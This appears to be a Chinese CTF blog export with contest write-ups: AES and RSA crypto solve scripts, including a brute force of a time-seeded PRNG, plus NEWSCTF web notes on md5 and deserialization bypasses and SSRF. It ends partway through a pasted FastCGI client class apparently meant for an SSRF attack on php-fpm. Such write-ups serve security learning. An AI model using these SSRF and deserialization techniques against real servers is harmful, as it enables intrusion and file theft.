<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">function_dec</span>(<span class="params">msg_p, key, aes_p</span>):</span></span><br><span class="line">    msg_p = Padding.pad(msg_p, <span class="number">16</span>)</span><br><span class="line">    struct = [msg_p[i:i+<span class="number">16</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(msg_p), <span class="number">16</span>)]</span><br><span class="line"></span><br><span class="line">    tmp_c = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> struct[<span class="number">3</span>:<span class="number">0</span>:-<span class="number">1</span>]:</span><br><span class="line">        c = strxor(aes_p, p)</span><br><span class="line">        tmp_c = c</span><br><span class="line">        c = AES.new(key, AES.MODE_ECB).decrypt(c)</span><br><span class="line">        aes_p = c</span><br><span class="line">    <span class="keyword">return</span> tmp_c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">key_hex = <span class="string">&#x27;279cf037f8b3a92b19b5bda978c294f5&#x27;</span></span><br><span class="line">aes_m4 = <span class="string">b&#x27;\xde@=0N\xbf\x0c\xc0i\x82\x02x\xd6z\x0e\x93&#x27;</span></span><br><span class="line">KEY = <span class="built_in">bytes</span>.fromhex(key_hex)</span><br><span class="line">msg = <span class="string">&#x27;I do not care the result&#x27;</span> + KEY.<span class="built_in">hex</span>()</span><br><span class="line">aes_c1 = function_dec(msg.encode(), KEY, aes_m4)</span><br><span class="line"></span><br><span class="line">out1 = <span class="string">&#x27;91e5fb43f053b21ce12e41df0b0ae0bb&#x27;</span></span><br><span class="line">answer1 = strxor(<span class="built_in">bytes</span>.fromhex(out1), aes_c1)</span><br><span class="line"></span><br><span class="line">msg1 = <span class="string">b&#x27;I do not care th&#x27;</span></span><br><span class="line">aes_m1 = AES.new(KEY, AES.MODE_ECB).decrypt(aes_c1)</span><br><span class="line">answer2 = strxor(msg1, aes_m1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(answer1 + answer2)</span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一，查看文档的重要性，我是查了文档之后才发现hex的反操作，一般两种操作是写在一起的，虽说long_to_bytes也可以</p>
<img alt="20210529 DozerCTF2021-4d6e44b1.png" data-src="http://mypictruebed.oss-cn-hangzhou.aliyuncs.com/img/20210529 DozerCTF2021-4d6e44b1.png" width="" height="" >

<p>其次是细心吧，确实一上手这种题有点绕，东西有点多，这就体现了画流程图的重要性，还有就是边做边用wp记录的习惯</p>
<p>最后是在发现不对后，怎么回溯的能力也很有帮助</p>
<hr>
<p>感谢尚师傅的鼎力赞助，才让我做出这题</p>
<p>呜呜呜那天三场比赛，算上这道才做出来2道题，呜呜呜留下来菜鸡的眼泪</p>
<p>后面的题目做出来的人也挺多的，有时间复现一下，正经人谁有时间啊</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
      <tags>
        <tag>AES</tag>
      </tags>
  </entry>
  <entry>
    <title>20210529 春秋杯网络安全联赛春季赛Crypto方向部分WP</title>
    <url>/posts/250213ee/</url>
    <content><![CDATA[<p>&nbsp;</p>
<span id="more"></span>

<h1 id="2021年春秋杯网络安全联赛春季赛"><a href="#2021年春秋杯网络安全联赛春季赛" class="headerlink" title="2021年春秋杯网络安全联赛春季赛"></a>2021年春秋杯网络安全联赛春季赛</h1><h2 id="time"><a href="#time" class="headerlink" title="time"></a>time</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>只有代码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> gmpy2.is_prime(x) == <span class="literal">False</span>:</span><br><span class="line">        random.seed(<span class="built_in">round</span>(time.time(),<span class="number">5</span>))</span><br><span class="line">        x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">hint = <span class="string">&quot;&quot;</span></span><br><span class="line">a1 = time.time()</span><br><span class="line">flag = <span class="string">&quot;flag&#123;***************&#125;&quot;</span></span><br><span class="line">p = get_prime(<span class="number">2048</span>)</span><br><span class="line">q = get_prime(<span class="number">2048</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag.encode())</span><br><span class="line"><span class="keyword">assert</span> n &gt; m</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line">hint+=<span class="built_in">str</span>(time.localtime())</span><br><span class="line">hint+=<span class="built_in">str</span>(time.time()-a1)   <span class="comment"># 告诉我们上面这段程序运行的时间</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(hint.encode())</span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = gmpy2.next_prime(p2)</span><br><span class="line">n2 = p2*q2</span><br><span class="line"><span class="keyword">assert</span> n2 &gt; m2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e2,n2)</span><br><span class="line"><span class="built_in">print</span>(n2)</span><br><span class="line"><span class="built_in">print</span>(c2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#n1=449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line"><span class="comment">#c1=401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line"><span class="comment">#n2=15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line"><span class="comment">#c2=2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br></pre></td></tr></table></figure>

<h3 id="题目解析"><a href="#题目解析" class="headerlink" title="题目解析"></a>题目解析</h3><p>有意思的题目，ilike</p>
<p>主要是利用了伪随机的特性，只要找到种子seed，伪随机就能找到规律</p>
<p>不难，保留了五位小数，直接爆破，我愿称Brute-force为最强</p>
<p>还有就是时间戳之间的转换，csdn上找到有博主这样转，贴个链接<br><a href="https://blog.csdn.net/google19890102/article/details/51355282">https://blog.csdn.net/google19890102/article/details/51355282</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:UTF-8</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">dt = <span class="string">&quot;2016-05-05 20:28:54&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> timestamp</span><br></pre></td></tr></table></figure>

<h3 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="comment"># 先求解hint</span></span><br><span class="line">n1 = <span class="number">449389319572014470973230701130712522617269811294117721031111991008431585050360094769229957883125144692171901233101564003762866045169460601700254891441878998743810037070537170855056466702105713343963726437141651081516150688905082129849562489646846756872586122801890652177495174154676725874072596207108180178755008058522945203093993733331873167443162263746938403044201113440457668163574342481361454421154163291201432319013385234751292922268166299917246608164679144459355173725895117315662317330324505156929077922670671914823996700321766811999551043586214703010131467697982137884162143358399786007967117340789211505834848813471803797101083738140019127129356248286854522464787917597152171952002118368747491099723673529923018951195522714900400225757160886780159504182902140132857743474716967975019342128486236748643365288547828026395873270777532526144687248477070253203339428149026199554962987646174586568177797380361174318868448467648171416588868990979461995030684403161898497550408697577695094783000808003197203603068043364687265824456069673330314452567416143754983137647607219859034406220590219587869898727679465514015732749105798134650890143215022311113143974714405713221391896497966231925409438383535066648782822255201778169275281703</span></span><br><span class="line">c1 = <span class="number">401489532945377793610793684722119773544780301600066410745513430092738470870254235710677331662917458735216486816223654944666672512914069274195244871184555059503843032370247894353363929996813688885280857203101709839776411016868985545599944237897372546401710041402579657231598311853522596463296090177664832759103736040102780428858301594805054838853076238331373482465072766841859415172741329175814259920949065993852870119473982972519779774470087935094963692097673607052443800723940091927016071427616754775915389245004208964143538205414854133746775614714447645057516665851780628694481268861808310238416724971673673850671343955386054575121362377868533055225219936712709474708031320743579595394353267596208729974198335174409673325772679039734706841988107519076516144633301371408301344929883397145523702189363308278963683356102257750758738297143036846718834812930796483716912661191147997005333798193659914573185697664706530774799114804036170190966523509331071964600280701252628276934131586398546602582672541075820188456265586487083315680880306767899236884202195162421559689536613740573005749847000477194096162091015847386298782974979446476432285118251267512895876728805199744415821498028998351171848530921695254428997423725875714923331577073</span></span><br><span class="line">n2 = <span class="number">15155267112260254814859334094046172735826002259080171081726998162357946701645037659523881592272031544049749021927125983252197909993392636398184049160807707719999605547760868696059871234441249045293267592302009677249269002811886149589869652213333369608947939768457152200437978105250737118847430275142343554191304134468404921824671763164876924921101985937224297479095246132228051655664880892772136476378294042631659251586654877292836243536438334288184387617801131434535466414123998495813296765847561162680781100446656391077184870802746066619879552452560641945080540683058930700833439189784657690146144976738557801495769</span></span><br><span class="line">c2 = <span class="number">2468578221703379861458008098241051507850837382948845085288946175636556753744182763176189585173648323464054032011039944322939163396161712722541432975739789351064988098201326803586126788175259878398963744821667593495161587855894677387881240566285601934559118064797092685909593247713834262369686831071897653756217369182373679039639016628932948775518889507209432291038498366540263588850133348471811624348709494110881127292350302658720685976197632586315945770832849119141593343924518836983738868912332048462058640564551286493338707636203013048694776131295632886983835291684044170004544049944003732133038154121113518892438</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">196611</span></span><br><span class="line">p2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675862831</span></span><br><span class="line">q2 = <span class="number">123106730572541218855605566021385436071765753262738029208958530903965781875227909642974714736010685670143580347743415357832685249865725150245921795069888441073829479429807586105897472912969591388975228566729202050232896382465835682108694199213251295570982696527682862415340158808173324606996424204650675860599</span></span><br><span class="line"><span class="comment"># hint = long_to_bytes(pow(c2, invert(e2, (p2-1)*(q2-1)), n2))</span></span><br><span class="line"><span class="comment"># print(hint)</span></span><br><span class="line"><span class="comment"># hint = &#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)3.1603143215179443&#x27;</span></span><br><span class="line"></span><br><span class="line">e1 = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">local_time = <span class="string">&#x27;time.struct_time(tm_year=2021, tm_mon=4, tm_mday=28, tm_hour=20, tm_min=42, tm_sec=6, tm_wday=2, tm_yday=118, tm_isdst=0)&#x27;</span></span><br><span class="line">dt = <span class="string">&quot;2021-04-28 20:42:06&quot;</span></span><br><span class="line"><span class="comment">#转换成时间数组</span></span><br><span class="line">timeArray = time.strptime(dt, <span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line"><span class="comment">#转换成时间戳</span></span><br><span class="line">timestamp = time.mktime(timeArray)</span><br><span class="line"><span class="comment"># print(timestamp)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prime</span>(<span class="params">bits, new_p</span>):</span></span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    random.seed(<span class="built_in">round</span>(new_p, <span class="number">5</span>))</span><br><span class="line">    x = random.getrandbits(bits)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = timestamp</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    t -= <span class="number">0.00001</span></span><br><span class="line">    <span class="built_in">print</span>(t)</span><br><span class="line">    hint = <span class="string">&quot;&quot;</span></span><br><span class="line">    a1 = time.time()</span><br><span class="line">    p = get_prime(<span class="number">2048</span>, t)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n1 % p != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    q = n1 // p</span><br><span class="line">    d = invert(e1, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c1, d, n1)</span><br><span class="line">    tmp_flag = long_to_bytes(m)</span><br><span class="line">    <span class="keyword">if</span> tmp_flag.startswith(<span class="string">b&#x27;flag&#x27;</span>):</span><br><span class="line">        <span class="built_in">print</span>(tmp_flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>flag呢？没有flag，寄几跑</p>
]]></content>
      <categories>
        <category>树哥让我天天写之Crypto</category>
      </categories>
  </entry>
  <entry>
    <title>20210601 NEWSCTFNova底登陆WP</title>
    <url>/posts/72f0c58/</url>
    <content><![CDATA[<p>考试月前的比赛，儿童节快乐哦</p>
<span id="more"></span>

<h1 id="NEWSCTF"><a href="#NEWSCTF" class="headerlink" title="NEWSCTF"></a>NEWSCTF</h1><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h3><p>web+misc php数组key溢出，暴力破解md5  数组绕过，</p>
<p>得到密码</p>
<p>图片后面有压缩包</p>
<h3 id="weblog"><a href="#weblog" class="headerlink" title="weblog"></a>weblog</h3><p>php 对函数和类名大小写不敏感，小写绕过，</p>
<p>__wakeup 那里 可以触发 __construct() 任意文件读取，读flag.php 就行</p>
<h3 id="impossible-ip"><a href="#impossible-ip" class="headerlink" title="impossible ip"></a>impossible ip</h3><p>那个函数可以打ssrf，ssrf  本地的flag.php 可以看到源码，</p>
<p>然后 写入hint.txt</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note : Code is released under the GNU LGPL</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Please do not change the header of this file</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is free software; you can redistribute it and/or modify it under the terms of the GNU</span></span><br><span class="line"><span class="comment"> * Lesser General Public License as published by the Free Software Foundation; either version 2 of</span></span><br><span class="line"><span class="comment"> * the License, or (at your option) any later version.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;</span></span><br><span class="line"><span class="comment"> * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * See the GNU Lesser General Public License for more details.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Handles communication with a FastCGI application</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>      Pierrick Charron &lt;pierrick<span class="doctag">@webstart</span>.fr&gt;</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>     1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FCGIClient</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> VERSION_1            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> BEGIN_REQUEST        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> ABORT_REQUEST        = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> END_REQUEST          = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> PARAMS               = <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">const</span> STDIN                = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">const</span> STDOUT               = <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">const</span> STDERR               = <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">const</span> DATA                 = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES           = <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">const</span> GET_VALUES_RESULT    = <span class="number">10</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_TYPE         = <span class="number">11</span>;</span><br><span class="line">    <span class="keyword">const</span> MAXTYPE              = <span class="built_in">self</span>::UNKNOWN_TYPE;</span><br><span class="line">    <span class="keyword">const</span> RESPONDER            = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> AUTHORIZER           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> FILTER               = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> REQUEST_COMPLETE     = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> CANT_MPX_CONN        = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">const</span> OVERLOADED           = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">const</span> UNKNOWN_ROLE         = <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_CONNS            = <span class="string">&#x27;MAX_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MAX_REQS             = <span class="string">&#x27;MAX_REQS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> MPXS_CONNS           = <span class="string">&#x27;MPXS_CONNS&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> HEADER_LEN           = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Socket</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Resource</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_sock</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Host</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> String</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_host</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Port</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Integer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_port</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Keep Alive</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> Boolean</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$_keepAlive</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Constructor</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $host Host of the FastCGI application</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $port Port of the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$host</span>, <span class="variable">$port</span> = <span class="number">9000</span></span>) // <span class="title">and</span> <span class="title">default</span> <span class="title">value</span> <span class="title">for</span> <span class="title">port</span>, <span class="title">just</span> <span class="title">for</span> <span class="title">unixdomain</span> <span class="title">socket</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_host = <span class="variable">$host</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_port = <span class="variable">$port</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Define whether or not the FastCGI application should keep the connection</span></span><br><span class="line"><span class="comment">     * alive at the end of a request</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Boolean $b true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setKeepAlive</span>(<span class="params"><span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_keepAlive = (<span class="keyword">boolean</span>)<span class="variable">$b</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_keepAlive &amp;&amp; <span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            fclose(<span class="keyword">$this</span>-&gt;_sock);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Get the keep alive status</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> Boolean true if the connection should stay alive, false otherwise</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getKeepAlive</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;_keepAlive;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Create a connection to the FastCGI application</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">            <span class="comment">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;_sock = stream_socket_client(<span class="keyword">$this</span>-&gt;_host, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">5</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;_sock) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Unable to connect to FastCGI application&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build a FastCGI packet</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $type Type of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $content Content of the packet</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> Integer $requestId RequestId</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildPacket</span>(<span class="params"><span class="variable">$type</span>, <span class="variable">$content</span>, <span class="variable">$requestId</span> = <span class="number">1</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$clen</span> = strlen(<span class="variable">$content</span>);</span><br><span class="line">        <span class="keyword">return</span> chr(<span class="built_in">self</span>::VERSION_1)         <span class="comment">/* version */</span></span><br><span class="line">            . chr(<span class="variable">$type</span>)                    <span class="comment">/* type */</span></span><br><span class="line">            . chr((<span class="variable">$requestId</span> &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) <span class="comment">/* requestIdB1 */</span></span><br><span class="line">            . chr(<span class="variable">$requestId</span> &amp; <span class="number">0xFF</span>)        <span class="comment">/* requestIdB0 */</span></span><br><span class="line">            . chr((<span class="variable">$clen</span> &gt;&gt; <span class="number">8</span> ) &amp; <span class="number">0xFF</span>)     <span class="comment">/* contentLengthB1 */</span></span><br><span class="line">            . chr(<span class="variable">$clen</span> &amp; <span class="number">0xFF</span>)             <span class="comment">/* contentLengthB0 */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* paddingLength */</span></span><br><span class="line">            . chr(<span class="number">0</span>)                        <span class="comment">/* reserved */</span></span><br><span class="line">            . <span class="variable">$content</span>;                     <span class="comment">/* content */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Build an FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $name Name</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> String $value Value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> String FastCGI Name value pair</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">buildNvpair</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$nlen</span> = strlen(<span class="variable">$name</span>);</span><br><span class="line">        <span class="variable">$vlen</span> = strlen(<span class="variable">$value</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$nlen</span> &lt; <span class="number">128</span>) &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr(<span class="variable">$nlen</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span></span><br><span class="line">            <span class="variable">$nvpair</span> = chr((<span class="variable">$nlen</span> &gt;&gt; <span class="number">24</span>) | 